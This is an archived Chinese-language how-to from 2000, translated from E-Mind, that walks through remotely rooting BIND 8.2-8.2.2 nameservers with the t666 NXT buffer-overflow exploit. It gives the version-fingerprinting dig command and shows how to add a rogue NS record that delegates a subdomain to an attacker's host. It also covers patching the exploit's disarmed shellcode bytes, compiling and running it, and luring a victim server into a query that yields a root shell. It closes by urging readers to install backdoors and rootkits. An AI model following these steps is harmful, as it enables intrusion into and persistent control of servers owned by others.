---
title: "bind8.2-8.2.2漏洞利用HOWTO"
date: 2000-09-22T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-4"
---

[quack](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=5) (quack_at_xfocus.org)

bind8.2-8.2.2漏洞利用HOWTO


by quack

参考资料:NXT-Howto---by E-Mind 


Section A - 何谓DNS?

--------------------------


     1. 怎样查询一个DNS?

         

         首先，你或许知道如果你配置好TCP/IP后希望能通过你的浏览器直接键入主机名

         就能找到一个网站，而不必每次都键入复杂难记的IP地址的话，你还需要配置

         DNS服务器，你可以从你的ISP那里得到DNS服务器的地址。UNIX系统提供了一个

         叫nslookup的实用工具来对DNS进行查询，它的语法如下：


         $nslookup <hostname>


         或者


         $nslookup <ip>

         

         配置DNS需要两个关于域的列表――zone文件，一个zone文件用来将域名解析为IP，

         另一个则将IP解析为域名，nslookup则是两者交互的工具，简单地在shell下键入

         nslookup并回车，你会得到一个>提示符，然后我们就可以输入IP地址或者域名了。

         关于nslookup的其它命令在后面我们会再陆续提到……

         

      2. 如何发现DNS的漏洞?


         记住我们是在寻找可利用的nameserver。

         首先我们必须找出运行在远程机器上DNS服务器的版本号，而且最好还要找出它

         的操作系统――现在已经有很多关于这些的讨论。我们将使用一个在大多数UNIX

         系统中都能使用的实用工具dig来做这件事，它的语法是：


         $dig @<victim_ip> version.bind chaos txt | grep \"8

         

         然后查看输出，如果你看到的是8.2或者8.2.1或8.2.2，那么它存在漏洞，如果是

         8.2.2P2 - P5则是安全的。

   

         如果你无法从你的终端中得到任何输出，则可能是DNS管理员修改过源代码，限制

         了这一信息的输出，当然它也有可能是存在漏洞的。

         

Section B - 如何编辑DNS？

--------------------------------------


   DNS的配置文件都是些文本，所以你要更改或者添加入口只需要编辑该文件并重启服务就

   行了，这个文件是/etc/named.conf或者/etc/named.boot，如果/etc/named.conf存在，

   那么它就是你的目标了……

   

      1. 怎样找到域文件?


         这是很简单的工作――你需要编辑zone文件来改变或者添加一个通往该域的入

         口，比如说――infoseek.com吧，主机名是www，所以正式域名(FQDN)就是

         [www.infoseek.com](http://www.infoseek.com/)(FQDN=Fully Qualified Domain Name)，要找到该zone文件

         我们首先要向DNS服务器进行查询，具体如下：

         

         $nslookup

         Default Server:  xxxxxx.xxxxxxx.xx.xx

         Address:  xxx.xx.xx.xx

         >set q=ns<ENTER>

         >infoseek.com<ENTER>

         >infoseek.com      nameserver = NS-UU.infoseek.com

         >NS-UU.infoseek.com    internet address = 198.5.208.3


         

         瞧，现在我们得到了infoseek.com的name server的IP地址，我们先假定自己

         是那台机器的root吧，我们SSH进入DNS，查找文件/etc/named.conf，我们可

         以在它的options部分看到


         directory "/var/named"


         这表示zone文件在/var/named下。


         更深入一点看看zone部分，在infoseek.com里我们可以看到：


         zone "infoseek.com"{

              type master;

              file "infoseek.com.zone";

         };


         所以现在我们知道我们所感兴趣的zone文件是：/var/named/infoseek.com.zone

         这就是我们所要编辑的东西了。


      2. 怎样编辑域文件?


         首先让我们好好看看zone文件吧

         在顶部的SOA段的东东暂时先不放到一边，往下看……你可以看到：

         

         @                 IN     NS      NS-UU.infoseek.com.

         www               IN     A       204.192.96.173

         ftp               IN     CNAME   corp-bbn

         corp-bbn          IN     A       204.192.96.2

         .

         .

         .

         

         有几种不同类型的记录，但要使我们的exploit运行起来，你只需要盯紧NS段就

         行了……

         quack注：

         (对/etc/named.conf或/etc/named.boot中的命令，偶现在作一下简单的介绍：


         a、SOA ：这是主服务器设定文件中必须设的命令，通常放在文件的第一行，如下：


         @   9999999  IN    SOA   NS-UU.infoseek.com.    quack.NS-UU.infoseek.com.

        壹     贰     叁    肆           伍                       陆


                                              1987022701;Searial          柒

                                              10800;Refresh 3 hour        捌

                                              3600 ;Retry   1 hour        玖

                                              3600000;expire  1000 hours  拾

                                              86400 );Minimum 24 hours    拾壹 


             壹：@表示当前域

             贰：TTL(time-to_live)，意思是在TTL时间内如果用户没有使用这个域名

                 则会自动消失，9999999表示永不超时。

             叁：地址类别，无须改动，填IN既可

             肆：SOA，开头记录

             伍：域名服务器，这里要注意的是必须在最后加上.如果没有加入.的话，系

                 统会在最后加上你所定义的域名。比如

                         

                www                    IN      A       204.192.96.173

                

                 也可以写成

        

                [www.infoseek.com.      IN      A      ](http://www.infoseek.com.�0�2�0�2�0�2�0�2�0�2�0�2in�0�2�0�2�0�2�0�2�0�2�0�2a�0�2�0�2�0�2�0�2�0�2�0�2/) 204.192.96.173

                

                 两者是一样的。

              陆：管理员的EMAIL，同样最后要加.

              柒：版本序列

              捌：更新时间

              玖：重试时间

              拾：终止时间

              拾壹：也是TTL，如果贰是空的话，将以此值为准   


         b、A：指定域名和IP地址的对应关系，如：


           www               IN     A       204.192.96.173

           壹                贰     叁           肆


             壹：主机名称

             叁：A命令在些就能够使[www.infoseek.com](http://www.infoseek.com/)与204.192.96.173对应


         c、NS：域名服务器的资源记录(这就是稍后我们要改的地方了，睁大眼哦) 

           

           @                 IN     NS      NS-UU.infoseek.com.

           壹     贰         叁     肆             伍


             壹：填机器名，或者@或留空表示自己所在域

             贰：留空则表示使用默认的TTL时间

             伍：域名服务器名


          d、CNAME：设定一台机器可以有的几个域名，如：

       

            ftp               IN     CNAME   corp-bbn

            corp-bbn               IN     A       204.192.96.2


            这样可以使域名为ftp.infoseek.com的机器和corp-bbn.infoseek.com

            所指的是同一台机器。


          e、PTR：让配置文件中的主机可以使用IP地址来知道所对应的域名)

                 

         

         为了让exploit正常工作，我们还需要加入一个子域，所以还是假定我们是这台

         NS-UU.infoseek.com的root吧……         

         

         如何加入一个子域呢?

         我们只需要加入另一个NS记录


         subdomain              IN      NS      hacker.box.com.


         这表示subdomain.infoseek.com的名字服务器是hacker.box.com,这个域名需要

         被解析成你的机器的IP，所以用你的正式域名替换它吧……现在我们需要重新

         启动名字服务器来使我们的改动生效。用下面的命令：       


         #/usr/sbin/ndc restart<ENTER>

         new pid is 24654

         #


Section C - 如何利用存在漏洞的机器？

-------------------------------------------------


      1. 开始之前需要准备什么？


         一台要运行exploit的机器

         一台有ROOT权限的DNS，更改过zone文件的……         

         

      2. 相关理论


         这个利用程序是根据BIND versions 8.2 - 8.2.2的缓冲溢出来远程获取root

         shell的。它将利用程序绑定在本地机器的端口53充当DNS SERVER，当某台机

         器进行查询时，会发送一个大的NXT记录――其中包含能使远程BIND SERVER溢

         出的代码――当然远程机器必须存在漏洞……

         

         如果你对缓冲区溢出感兴趣的话，可以阅读Aleph One的精采文章：

         

         Phrack 49 Article 14 - Smashing The Stack For Fun And Profit.

         URL: [http://www.phrack.com/search.phtml?view&article;=p49-14](http://www.phrack.com/search.phtml?view&article=p49-14)


         译者注：这篇文章已由TT翻译成中文，在白云黄鹤BBS、HackerBBS及绿盟BBS里都有


      3. 从何处获得利用程序?


         [http://www.hack.co.za/daem0n/named/t666.c](http://www.hack.co.za/daem0n/named/t666.c)


      4. 我为什么要patch利用程序？


         你或许听说过可能要对利用程序进行patch才能正确使用，这是因为ADM认为只

         有比较出色的hacker才能使用他们的exploit，所以他们在代码里留了个小小的

         bug――实际上就是将shellcode里的/bin/sh替换成了/adm/sh……


      5. 如何patch?

         

         只需要对代码做很小的改动：


         / = 2F(HEX)   ===>  / = 2F(HEX)

         a = 61(HEX)   ===>  b = 62(HEX)

         d = 64(HEX)   ===>  i = 69(HEX)

         m = 6D(HEX)   ===>  n = 6E(HEX)

         / = 2F(HEX)   ===>  / = 2F(HEX)

          

         所以所有我们需要做的就是找出源代码中的

         0x2f,0x61,0x64,0x6d,0x2f替换成0x2f,0x62,0x69,0x6e,0x2f

         就行了。


      6. 如何编译?

         

         $gcc t666.c -o t666<ENTER>

         $


      7. 如何运行?


         $su<ENTER>

         Password:<password><ENTER>

         #./t666 1<ENTER>


         当然如果在这台你运行exploit的机器上如果原来有运行named的话，要先杀掉


         # killall -9 named


         这时exploit就已经绑定在53端口并且等待有漏洞的机器的查询了，一旦某个查

         询请求发出，这台机器上会有如下输出：


         Received request from xxx.xx.xx.xx:1025 for xxx.xxxxxxxxx.xx.xx type=1

         

         好了，如果来查询的机器是运行Linux Redhat 6.x    - named 8.2/8.2.1

         (from rpm)的话，你就爽了，能够拿到一个rootshell了……为什么要红帽呢？

         因为我们在运行时指定了./t666 1，看看下边的usage就知道了……

         我只在红帽LINUX下测试运行，所以不要询问为何solaris不能用之类的问题，我

         没有solaris来测试，而且我也没有更多的时间来做这件事……

         你将会得到一个远程的root shell――如同现在大多数远程利用程序一样，开

         的将是1524的端口。下面是这个利用程序的usage……


         Usage: ./t666 architecture [command]

         Available architectures:

         1: Linux Redhat 6.x    - named 8.2/8.2.1 (from rpm)

         2: Linux SolarDiz's non-exec stack patch - named 8.2/8.2.1

         3: Solaris 7 (0xff)    - named 8.2.1

         4: Solaris 2.6         - named 8.2.1

         5: FreeBSD 3.2-RELEASE - named 8.2

         6: OpenBSD 2.5         - named 8.2

         7: NetBSD 1.4.1        - named 8.2.1


      8. 让目标DNS服务器查询我的IP


         当你在name server里添加了一个subdomain并将自己加入DNS后，一切都很简

         单了，你需要做的仅仅是在你加入的主域中查询一个有漏洞的主机……

         

         $nslookup

         >server <victim><ENTER>

         >[www.subdomain.infoseek.com<ENTER>](http://www.subdomain.infoseek.com/)


         看看会发生什么吧――当查询发生时，NS-UU.infoseek.com会告诉victim机器

         你的hacker.box.com.是最权威的NAME SERVER……所以victim就找上门来了，

         然后……:)

         

      9. 离开前该做的事


         你可以在上面添加自己的后门以便日后再来访问

         在因特网上你可以找到大量的木马及rootkit，至于怎么装，是你自己的事了……


Section D - 版权声明 


      1. 这篇文章的大多数是从E-Mind的BIND 8.2 - 8.2.2 *Remote root Exploit How-To* 

         翻译过来的，对此文的版权当然归属原作者――后面一串的声明俺就不译了……


      2. 俺码的字没有版权，高兴转就转，高兴改就改……当然出事不是俺的错……对这篇文

         字俺所做的就是在section B加了些有关DNS的技术说明，本来在section C要加上一

         点自己的测试说明，但昨天在白云黄鹤见了cloudsky大虾的话，便藏私了……


---------------------------------------

敬请高手指点,mailto:quack@antionline.org
